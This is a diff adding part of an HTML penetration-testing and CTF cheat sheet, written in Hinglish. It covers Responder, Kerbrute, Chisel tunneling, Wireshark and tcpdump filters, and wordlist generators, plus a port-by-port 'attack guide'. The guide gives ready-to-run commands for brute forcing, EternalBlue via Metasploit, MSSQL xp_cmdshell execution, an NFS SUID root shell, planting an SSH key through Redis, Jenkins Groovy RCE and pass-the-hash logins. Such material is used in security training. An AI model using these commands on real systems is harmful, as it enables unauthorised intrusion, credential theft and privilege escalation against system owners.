+<tr><td>binwalk -e file</td><td>Extract</td><td>Embedded files extract karo</td></tr>
+<tr><td>binwalk -M file</td><td>Matryoshka</td><td>Recursive extraction</td></tr>
+<tr><td>binwalk -B file</td><td>Entropy</td><td>Entropy analysis — encrypted parts</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── STRINGS / EXIFTOOL ──</td></tr>
+<tr><td>strings file</td><td>Strings</td><td>Printable strings nikalo</td></tr>
+<tr><td>strings -n 8 file</td><td>Strings</td><td>Min 8 char strings</td></tr>
+<tr><td>strings file | grep -i "flag\|password\|secret"</td><td>Grep</td><td>Keywords dhundho</td></tr>
+<tr><td>exiftool file</td><td>Metadata</td><td>Sab EXIF metadata dekho</td></tr>
+<tr><td>exiftool -all= -overwrite_original file</td><td>Strip</td><td>Sab metadata remove karo</td></tr>
+<tr><td>file filename</td><td>Type</td><td>File ka actual type kya hai</td></tr>
+<tr><td>hexdump -C file | head -20</td><td>Hex</td><td>File header (magic bytes)</td></tr>
+</table>
+</div>
+
+</div><!-- crypto -->
+
+<!-- ═══ MISC ═══ -->
+<div class="sheet" id="s-misc">
+
+<div class="tool">
+<div class="tool-title"><h2>🎯 RESPONDER</h2><span class="cat c-r">MITM</span><span class="port">LLMNR/NBT-NS</span></div>
+<div class="tool-desc">Network pe NTLM hash capture karo — LLMNR/NBT-NS poisoning</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-I eth0</td><td>Interface</td><td>Network interface</td></tr>
+<tr><td>-w</td><td>WPAD</td><td>WPAD rogue proxy server</td></tr>
+<tr><td>-r</td><td>NBT-NS</td><td>NBT-NS responses enable</td></tr>
+<tr><td>-f</td><td>Fingerprint</td><td>OS fingerprinting</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose mode</td></tr>
+<tr><td>-A</td><td>Analyze</td><td>Analyze mode — sirf listen, poison nahi</td></tr>
+<tr><td>-b</td><td>Basic</td><td>Basic HTTP auth</td></tr>
+<tr><td>-P</td><td>Proxy</td><td>NTLM proxy auth</td></tr>
+<tr><td>-d</td><td>DHCP</td><td>DHCP rogue server</td></tr>
+<tr><td>--lm</td><td>LM</td><td>LM hashes force karo</td></tr>
+<tr><td>cat /usr/share/responder/logs/</td><td>Logs</td><td>Captured hashes yahan hain</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 KERBRUTE</h2><span class="cat c-b">Kerberos</span></div>
+<div class="tool-desc">Kerberos se valid usernames enumerate karo + password spray</div>
+<table>
+<tr><th>Command / Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>userenum</td><td>Mode</td><td>Username enumeration mode</td></tr>
+<tr><td>passwordspray</td><td>Mode</td><td>Password spray mode</td></tr>
+<tr><td>bruteuser</td><td>Mode</td><td>Single user brute force</td></tr>
+<tr><td>bruteforce</td><td>Mode</td><td>Full brute force</td></tr>
+<tr><td>--dc DC_IP</td><td>DC</td><td>Domain Controller IP</td></tr>
+<tr><td>-d domain.local</td><td>Domain</td><td>Domain name</td></tr>
+<tr><td>--users users.txt</td><td>Users</td><td>Usernames file (userenum mode)</td></tr>
+<tr><td>-t 10</td><td>Threads</td><td>Threads</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Verbose</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Commands</div>
+<div class="ex">kerbrute userenum <span class="f">--dc</span> DC_IP <span class="f">-d</span> domain.local users.txt</div>
+<div class="ex">kerbrute passwordspray <span class="f">--dc</span> DC_IP <span class="f">-d</span> domain.local users.txt <span class="a">Password123!</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🚇 CHISEL — TCP Tunneling</h2><span class="cat c-b">Pivoting</span></div>
+<div class="tool-desc">Fast TCP tunnel — HTTP se tunnel banao, SOCKS5 proxy, port forwarding</div>
+<table>
+<tr><th>Flag</th><th>Mode</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── SERVER (Kali pe) ──</td></tr>
+<tr><td>server -p 8000</td><td>Server</td><td>Basic server port 8000 pe</td></tr>
+<tr><td>server -p 8000 --reverse</td><td>Server</td><td>Reverse connections allow karo</td></tr>
+<tr><td>server --port 8000 --auth user:pass</td><td>Server</td><td>Auth ke saath</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CLIENT (Victim pe) ──</td></tr>
+<tr><td>client KALI_IP:8000 R:PORT:TARGET:PORT</td><td>Forward</td><td>Reverse port forward</td></tr>
+<tr><td>client KALI_IP:8000 R:socks</td><td>SOCKS</td><td>SOCKS5 proxy — port 1080 pe</td></tr>
+<tr><td>client KALI_IP:8000 PORT:INTERNAL_IP:PORT</td><td>Local</td><td>Local port forward</td></tr>
+<tr><td>--fingerprint HASH</td><td>Auth</td><td>Server fingerprint verify karo</td></tr>
+<tr><td>--auth user:pass</td><td>Auth</td><td>Auth ke saath connect</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── PROXYCHAINS ──</td></tr>
+<tr><td>echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf</td><td>Setup</td><td>SOCKS5 proxy add karo</td></tr>
+<tr><td>proxychains nmap -sT TARGET</td><td>Use</td><td>Nmap tunnel ke through</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>📡 WIRESHARK — Display Filters</h2><span class="cat c-g">Network</span></div>
+<div class="tool-desc">Network traffic analyze karo — CTF mein .pcap files decode karo</div>
+<table>
+<tr><th>Filter</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>http</td><td>Protocol</td><td>Sirf HTTP traffic</td></tr>
+<tr><td>https / ssl / tls</td><td>Protocol</td><td>HTTPS/TLS traffic</td></tr>
+<tr><td>ftp</td><td>Protocol</td><td>FTP — cleartext credentials!</td></tr>
+<tr><td>dns</td><td>Protocol</td><td>DNS queries</td></tr>
+<tr><td>smb</td><td>Protocol</td><td>SMB traffic</td></tr>
+<tr><td>tcp</td><td>Protocol</td><td>Sirf TCP</td></tr>
+<tr><td>udp</td><td>Protocol</td><td>Sirf UDP</td></tr>
+<tr><td>tcp.port == 4444</td><td>Port</td><td>Specific port</td></tr>
+<tr><td>ip.addr == 192.168.1.1</td><td>IP</td><td>Specific IP — in or out</td></tr>
+<tr><td>ip.src == 192.168.1.1</td><td>IP</td><td>Source IP</td></tr>
+<tr><td>ip.dst == 192.168.1.1</td><td>IP</td><td>Destination IP</td></tr>
+<tr><td>http.request.method == "POST"</td><td>HTTP</td><td>POST requests — credentials yahan!</td></tr>
+<tr><td>http.request.uri contains "login"</td><td>HTTP</td><td>Login URLs</td></tr>
+<tr><td>frame contains "password"</td><td>Search</td><td>Keyword search</td></tr>
+<tr><td>tcp.stream eq 5</td><td>Stream</td><td>TCP stream 5 follow karo</td></tr>
+<tr><td>!(arp or dns or icmp)</td><td>Filter</td><td>Noisy protocols hide karo</td></tr>
+<tr><td>http.response.code == 200</td><td>HTTP</td><td>Successful responses</td></tr>
+<tr><td>tcp contains "flag{"</td><td>CTF</td><td>Flag dhundho!</td></tr>
+</table>
+<div class="note">💡 Follow TCP Stream: Right click → Follow → TCP Stream — full conversation ek jagah dikhega! Credentials clear dikhti hain FTP/HTTP mein!</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🧰 TCPDUMP</h2><span class="cat c-g">Network</span></div>
+<div class="tool-desc">CLI packet capture — server pe capture karo, file save karo, Wireshark mein analyze karo</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-i eth0</td><td>Interface</td><td>Interface specify karo (eth0/tun0/any)</td></tr>
+<tr><td>-w file.pcap</td><td>Write</td><td>File mein save karo</td></tr>
+<tr><td>-r file.pcap</td><td>Read</td><td>File se padho</td></tr>
+<tr><td>-n</td><td>NoLookup</td><td>DNS lookup mat karo</td></tr>
+<tr><td>-v / -vv / -vvv</td><td>Verbose</td><td>Verbosity levels</td></tr>
+<tr><td>-A</td><td>ASCII</td><td>Packet payload ASCII mein dikhao</td></tr>
+<tr><td>-X</td><td>Hex+ASCII</td><td>Hex aur ASCII dono</td></tr>
+<tr><td>-c 100</td><td>Count</td><td>Sirf 100 packets capture karo</td></tr>
+<tr><td>port 80</td><td>Filter</td><td>Sirf port 80 ka traffic</td></tr>
+<tr><td>host 192.168.1.1</td><td>Filter</td><td>Specific host</td></tr>
+<tr><td>src host IP</td><td>Filter</td><td>Source IP se traffic</td></tr>
+<tr><td>dst host IP</td><td>Filter</td><td>Destination IP ko traffic</td></tr>
+<tr><td>tcp</td><td>Filter</td><td>Sirf TCP</td></tr>
+<tr><td>udp</td><td>Filter</td><td>Sirf UDP</td></tr>
+<tr><td>not port 22</td><td>Filter</td><td>SSH traffic exclude karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🧰 WORDLIST TOOLS — CeWL + Crunch</h2><span class="cat c-r">Wordlist</span></div>
+<div class="tool-desc">Custom wordlists banana — website se ya patterns se</div>
+<table>
+<tr><th>Tool / Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CEWL — Website Wordlist ──</td></tr>
+<tr><td>-d 2</td><td>Depth</td><td>Spider depth (default 2)</td></tr>
+<tr><td>-m 5</td><td>MinWord</td><td>Minimum word length</td></tr>
+<tr><td>-w wordlist.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td>--email</td><td>Email</td><td>Email addresses bhi collect karo</td></tr>
+<tr><td>--meta</td><td>Meta</td><td>Metadata se bhi words</td></tr>
+<tr><td>-u "Mozilla/5.0"</td><td>UA</td><td>Custom User-Agent</td></tr>
+<tr><td>--lowercase</td><td>Case</td><td>Sirf lowercase</td></tr>
+<tr><td>-a</td><td>Meta</td><td>All metadata</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CRUNCH — Pattern Generator ──</td></tr>
+<tr><td>crunch MIN MAX charset</td><td>Basic</td><td>Min-Max length, characters</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output file</td></tr>
+<tr><td>-t @,%^</td><td>Pattern</td><td>@ = lowercase, , = uppercase, % = numbers, ^ = symbols</td></tr>
+<tr><td>-s startword</td><td>Start</td><td>Is word se shuru karo</td></tr>
+<tr><td>-e endword</td><td>End</td><td>Is word pe khatam karo</td></tr>
+<tr><td>-b 1mb</td><td>Size</td><td>Max file size per file</td></tr>
+<tr><td>-d 2@</td><td>Dup</td><td>Max 2 duplicate consecutive lowercase</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Crunch Examples</div>
+<div class="ex">crunch 8 8 0123456789 <span class="f">-o</span> nums.txt <span class="c">           # 8-digit PIN</span></div>
+<div class="ex">crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 <span class="f">-o</span> alpha.txt</div>
+<div class="ex">crunch 10 10 <span class="f">-t</span> Karan@@@@@ <span class="f">-o</span> custom.txt <span class="c"> # Karan + 5 digits</span></div>
+</div>
+</div>
+
+</div><!-- misc -->
+
+<div class="sheet" id="s-ports">
+<div class="tool"><div style="background:rgba(0,255,136,0.08);border-left:3px solid #00ff88;padding:10px 14px;margin-bottom:10px;font-size:12px;color:#7ee787">🔌 COMMON PORTS ATTACK GUIDE — Port dikha? Yahan se uthao apna move!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 21 — FTP</div>
+<div class="ex"><span class="c"># Step 1: Anonymous login try karo</span>
+ftp TARGET_IP
+<span class="c">Username:</span> anonymous | <span class="c">Password:</span> anonymous
+
+<span class="c"># Step 2: NSE se auto check</span>
+nmap -p21 --script ftp-anon,ftp-vsftpd-backdoor TARGET_IP
+
+<span class="c"># Step 3: Brute force</span>
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+
+<span class="c"># FTP commands (andar aane ke baad)</span>
+ls -la | get file.txt | put shell.php | mget *</div>
+<div class="desc">vsftpd 2.3.4 = backdoor! | Anonymous most common | File upload → webshell!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 22 — SSH</div>
+<div class="ex"><span class="c"># Banner grab</span>
+nc TARGET_IP 22
+
+<span class="c"># id_rsa key mili? Direct login!</span>
+chmod 600 id_rsa
+ssh -i id_rsa user@TARGET_IP
+
+<span class="c"># Brute force</span>
+hydra -L users.txt -P rockyou.txt TARGET_IP ssh -t 4
+hydra -l root -P rockyou.txt ssh://TARGET_IP
+
+<span class="c"># SSH key crack</span>
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=rockyou.txt</div>
+<div class="desc">Default creds: root:root, admin:admin, root:toor | Old version → searchsploit</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 23 — TELNET</div>
+<div class="ex"><span class="c"># Direct connect</span>
+telnet TARGET_IP 23
+
+<span class="c"># Enum</span>
+nmap -p23 --script telnet-ntlm-info TARGET_IP
+
+<span class="c"># Brute</span>
+hydra -l admin -P rockyou.txt telnet://TARGET_IP</div>
+<div class="desc">Unencrypted! Wireshark se sniff karo | Default: admin:admin, cisco:cisco</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 25/587 — SMTP</div>
+<div class="ex"><span class="c"># User enumeration (VRFY method)</span>
+smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
+nmap -p25 --script smtp-enum-users,smtp-open-relay TARGET_IP
+
+<span class="c"># Manual</span>
+nc TARGET_IP 25
+HELO test
+VRFY root          <span class="c"># 250 = user exist karta hai</span>
+VRFY nobody        <span class="c"># 550 = exist nahi karta</span></div>
+<div class="desc">Valid users nikalo → SSH/FTP pe same creds try karo!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 53 — DNS</div>
+<div class="ex"><span class="c"># Zone transfer (GOLD!)</span>
+dig axfr @TARGET_IP domain.htb
+host -l domain.htb TARGET_IP
+
+<span class="c"># Subdomain brute</span>
+gobuster dns -d domain.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r TARGET_IP
+
+<span class="c"># /etc/hosts mein add karo</span>
+echo "TARGET_IP domain.htb" >> /etc/hosts</div>
+<div class="desc">Zone transfer success = full network map! | Subdomains mein hidden apps ho sakte hain</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 80/443 — HTTP/HTTPS</div>
+<div class="ex"><span class="c"># Fingerprint</span>
+whatweb http://TARGET_IP
+curl -I http://TARGET_IP
+
+<span class="c"># Dir bust</span>
+gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
+ffuf -u http://TARGET_IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+<span class="c"># Vuln scan</span>
+nikto -h http://TARGET_IP
+
+<span class="c"># WordPress?</span>
+wpscan --url http://TARGET_IP --enumerate u,p,t
+
+<span class="c"># Check manually</span>
+robots.txt | sitemap.xml | /.git/ | /backup/ | /admin/ | /.env</div>
+<div class="desc">Sabse zyada attack surface! | CMS detect karo → version CVE dhundho</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 111 — RPCBind</div>
+<div class="ex"><span class="c"># RPC services list</span>
+rpcinfo -p TARGET_IP
+nmap -p111 --script rpcinfo TARGET_IP
+
+<span class="c"># NFS exposed hai?</span>
+showmount -e TARGET_IP</div>
+<div class="desc">RPC 111 → NFS 2049 leak ho sakti hai! Dono check karo.</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 139/445 — SMB</div>
+<div class="ex"><span class="c"># Full enum</span>
+enum4linux -a TARGET_IP
+
+<span class="c"># Shares list (null session)</span>
+smbclient -L //TARGET_IP/ -N
+crackmapexec smb TARGET_IP -u '' -p '' --shares
+
+<span class="c"># Share access</span>
+smbclient //TARGET_IP/ShareName -N
+
+<span class="c"># EternalBlue check (MS17-010)</span>
+nmap -p445 --script smb-vuln-ms17-010 TARGET_IP
+
+<span class="c"># MSF exploit</span>
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS TARGET_IP
+run</div>
+<div class="desc">MS17-010 = SYSTEM shell! | Null session = anonymous access | smbmap bhi try karo</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 161 (UDP) — SNMP</div>
+<div class="ex"><span class="c"># Full dump</span>
+snmpwalk -c public -v1 TARGET_IP
+snmp-check TARGET_IP -c public
+
+<span class="c"># Community string brute</span>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt TARGET_IP
+
+<span class="c"># NSE</span>
+nmap -sU -p161 --script snmp-info,snmp-processes,snmp-win32-users TARGET_IP</div>
+<div class="desc">Community "public" default hai | Users, processes, network info leak | UDP hai — nmap -sU use karo</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 389/636 — LDAP</div>
+<div class="ex"><span class="c"># Anonymous bind</span>
+ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=htb"
+
+<span class="c"># Only usernames</span>
+ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=htb" "(objectClass=user)" sAMAccountName
+
+<span class="c"># NSE</span>
+nmap -p389 --script ldap-rootdse,ldap-search TARGET_IP</div>
+<div class="desc">Anonymous bind → AD users dump! → ASREPRoasting try karo!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 1433 — MSSQL</div>
+<div class="ex"><span class="c"># Connect</span>
+impacket-mssqlclient sa:sa@TARGET_IP
+crackmapexec mssql TARGET_IP -u sa -p sa
+
+<span class="c"># NSE</span>
+nmap -p1433 --script ms-sql-info,ms-sql-empty-password TARGET_IP
+
+<span class="c"># xp_cmdshell = RCE!</span>
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure 'xp_cmdshell', 1;
+EXEC xp_cmdshell 'whoami';</div>
+<div class="desc">Default: sa:sa, sa:(blank) | xp_cmdshell enable → OS command execution!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 2049 — NFS</div>
+<div class="ex"><span class="c"># Exports dekho</span>
+showmount -e TARGET_IP
+
+<span class="c"># Mount karo</span>
+mkdir /tmp/nfs
+mount -t nfs TARGET_IP:/share /tmp/nfs
+
+<span class="c"># no_root_squash exploit!</span>
+cp /bin/bash /tmp/nfs/
+chmod +s /tmp/nfs/bash     <span class="c"># SUID set karo</span>
+<span class="c"># Victim pe:</span>
+/tmp/bash -p               <span class="c"># → root shell!</span></div>
+<div class="desc">no_root_squash = priv esc! | Files directly read/write karo on shares</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 3306 — MYSQL</div>
+<div class="ex"><span class="c"># Connect</span>
+mysql -u root -p -h TARGET_IP
+
+<span class="c"># NSE</span>
+nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases TARGET_IP
+
+<span class="c"># Andar aane ke baad</span>
+show databases;
+use dbname;
+show tables;
+select * from users;
+select user,password from mysql.user;</div>
+<div class="desc">Default: root:(blank), root:root | Hashes nikalo → hashcat/john se crack!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 3389 — RDP</div>
+<div class="ex"><span class="c"># GUI Login</span>
+xfreerdp /u:Administrator /p:Password123 /v:TARGET_IP
+rdesktop TARGET_IP -u admin -p password
+
+<span class="c"># BlueKeep check</span>
+nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP
+
+<span class="c"># Brute force</span>
+hydra -l Administrator -P rockyou.txt rdp://TARGET_IP -t 1</div>
+<div class="desc">BlueKeep CVE-2019-0708 | Creds mil gaye → GUI access | Pass-the-Hash: xfreerdp /pth:HASH</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 5985/5986 — WinRM</div>
+<div class="ex"><span class="c"># Shell lo</span>
+evil-winrm -i TARGET_IP -u username -p password
+
+<span class="c"># Pass-the-Hash (password nahi chahiye!)</span>
+evil-winrm -i TARGET_IP -u username -H NTLM_HASH
+
+<span class="c"># Validate creds</span>
+crackmapexec winrm TARGET_IP -u user -p pass</div>
+<div class="desc">5985=HTTP, 5986=HTTPS | evil-winrm mein upload/download bhi hoga!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 6379 — REDIS</div>
+<div class="ex"><span class="c"># Connect (no auth zyada tar)</span>
+redis-cli -h TARGET_IP
+redis-cli -h TARGET_IP info
+
+<span class="c"># SSH key plant karo → root access!</span>
+redis-cli -h TARGET_IP config set dir /root/.ssh
+redis-cli -h TARGET_IP config set dbfilename authorized_keys
+redis-cli -h TARGET_IP set x "SSH_PUB_KEY_HERE"
+redis-cli -h TARGET_IP save</div>
+<div class="desc">Often no auth! | SSH key write = root shell | try auth: redis-cli AUTH password</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 8080/8443/8000 — HTTP ALTERNATE</div>
+<div class="ex"><span class="c"># Banner grab</span>
+curl -I http://TARGET_IP:8080
+gobuster dir -u http://TARGET_IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+<span class="c"># Jenkins (8080) → Script Console → RCE!</span>
+<span class="c"># /script mein jaao → groovy:</span>
+cmd = "id".execute(); println(cmd.text)
+
+<span class="c"># Tomcat Manager (8080)</span>
+<span class="c"># /manager/html → default: tomcat:tomcat</span>
+<span class="c"># WAR file upload → reverse shell!</span></div>
+<div class="desc">Jenkins/Tomcat/Jupyter check karo | Jenkins Script Console = instant RCE!</div>
+
+<div style="font-weight:700;color:#f0883e;margin:12px 0 6px;font-size:13px">PORT 27017 — MONGODB</div>
+<div class="ex"><span class="c"># Connect (usually no auth)</span>
+mongo TARGET_IP:27017
+
+<span class="c"># Data dump</span>
+show dbs;
+use dbname;
+show collections;
+db.collection.find();
+db.users.find().pretty();
+
+<span class="c"># NSE</span>
+nmap -p27017 --script mongodb-info,mongodb-databases TARGET_IP</div>
+<div class="desc">Often exposed without auth! | Credentials, personal data dump possible</div>
+
+<div style="margin-top:14px;background:rgba(0,255,136,0.06);border:1px solid rgba(0,255,136,0.25);border-radius:6px;padding:12px;font-size:11px;overflow-x:auto;-webkit-overflow-scrolling:touch">
+<div style="color:#00ff88;font-weight:700;margin-bottom:8px">⚡ QUICK PORT → ATTACK TABLE</div>
+<table style="width:100%;border-collapse:collapse;min-width:550px">
+<tr style="color:#00ff88;font-size:11px"><th style="padding:5px 8px;border:1px solid #30363d;text-align:left">Port</th><th style="padding:5px 8px;border:1px solid #30363d">Service</th><th style="padding:5px 8px;border:1px solid #30363d">Pehla Move</th><th style="padding:5px 8px;border:1px solid #30363d">Common Vuln</th></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">21</td><td style="padding:4px 8px;border:1px solid #30363d">FTP</td><td style="padding:4px 8px;border:1px solid #30363d">anonymous login</td><td style="padding:4px 8px;border:1px solid #30363d">vsftpd backdoor</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">22</td><td style="padding:4px 8px;border:1px solid #30363d">SSH</td><td style="padding:4px 8px;border:1px solid #30363d">id_rsa hunt / brute</td><td style="padding:4px 8px;border:1px solid #30363d">Weak creds, old version</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">23</td><td style="padding:4px 8px;border:1px solid #30363d">Telnet</td><td style="padding:4px 8px;border:1px solid #30363d">direct connect</td><td style="padding:4px 8px;border:1px solid #30363d">Plain text, weak creds</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">25</td><td style="padding:4px 8px;border:1px solid #30363d">SMTP</td><td style="padding:4px 8px;border:1px solid #30363d">VRFY user enum</td><td style="padding:4px 8px;border:1px solid #30363d">Open relay, user enum</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">53</td><td style="padding:4px 8px;border:1px solid #30363d">DNS</td><td style="padding:4px 8px;border:1px solid #30363d">dig axfr zone transfer</td><td style="padding:4px 8px;border:1px solid #30363d">Zone transfer</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">80/443</td><td style="padding:4px 8px;border:1px solid #30363d">HTTP/S</td><td style="padding:4px 8px;border:1px solid #30363d">gobuster + nikto</td><td style="padding:4px 8px;border:1px solid #30363d">SQLi, LFI, RFI, RCE</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">139/445</td><td style="padding:4px 8px;border:1px solid #30363d">SMB</td><td style="padding:4px 8px;border:1px solid #30363d">enum4linux + MS17-010</td><td style="padding:4px 8px;border:1px solid #30363d">EternalBlue = SYSTEM</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">161</td><td style="padding:4px 8px;border:1px solid #30363d">SNMP</td><td style="padding:4px 8px;border:1px solid #30363d">snmpwalk public</td><td style="padding:4px 8px;border:1px solid #30363d">Default community</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">389</td><td style="padding:4px 8px;border:1px solid #30363d">LDAP</td><td style="padding:4px 8px;border:1px solid #30363d">anon bind ldapsearch</td><td style="padding:4px 8px;border:1px solid #30363d">AD user dump</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">1433</td><td style="padding:4px 8px;border:1px solid #30363d">MSSQL</td><td style="padding:4px 8px;border:1px solid #30363d">sa:sa login</td><td style="padding:4px 8px;border:1px solid #30363d">xp_cmdshell RCE</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">2049</td><td style="padding:4px 8px;border:1px solid #30363d">NFS</td><td style="padding:4px 8px;border:1px solid #30363d">showmount -e</td><td style="padding:4px 8px;border:1px solid #30363d">no_root_squash privesc</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">3306</td><td style="padding:4px 8px;border:1px solid #30363d">MySQL</td><td style="padding:4px 8px;border:1px solid #30363d">root:(blank)</td><td style="padding:4px 8px;border:1px solid #30363d">Weak creds, hash dump</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">3389</td><td style="padding:4px 8px;border:1px solid #30363d">RDP</td><td style="padding:4px 8px;border:1px solid #30363d">xfreerdp GUI</td><td style="padding:4px 8px;border:1px solid #30363d">BlueKeep CVE-2019-0708</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">5985</td><td style="padding:4px 8px;border:1px solid #30363d">WinRM</td><td style="padding:4px 8px;border:1px solid #30363d">evil-winrm</td><td style="padding:4px 8px;border:1px solid #30363d">Pass-the-Hash</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">6379</td><td style="padding:4px 8px;border:1px solid #30363d">Redis</td><td style="padding:4px 8px;border:1px solid #30363d">redis-cli no auth</td><td style="padding:4px 8px;border:1px solid #30363d">SSH key write → root</td></tr>
+<tr style="background:#161b22"><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">8080</td><td style="padding:4px 8px;border:1px solid #30363d">HTTP Alt</td><td style="padding:4px 8px;border:1px solid #30363d">browser + gobuster</td><td style="padding:4px 8px;border:1px solid #30363d">Jenkins RCE, Tomcat mgr</td></tr>
+<tr><td style="padding:4px 8px;border:1px solid #30363d;color:#f0883e">27017</td><td style="padding:4px 8px;border:1px solid #30363d">MongoDB</td><td style="padding:4px 8px;border:1px solid #30363d">mongo no auth</td><td style="padding:4px 8px;border:1px solid #30363d">No auth exposed</td></tr>
+</table>
+</div>
+</div><!-- ports tool div -->
+</div><!-- s-ports -->
+
+<script>
+function show(id,btn){
+  document.querySelectorAll('.sheet').forEach(s=>s.classList.remove('on'));
+  document.querySelectorAll('.tab').forEach(b=>b.classList.remove('on'));
+  var el=document.getElementById('s-'+id);
+  if(el)el.classList.add('on');
+  if(btn)btn.classList.add('on');
+}
+window.onload=()=>show('recon',document.querySelector('.tab'));
+</script>
+</body>
+</html>
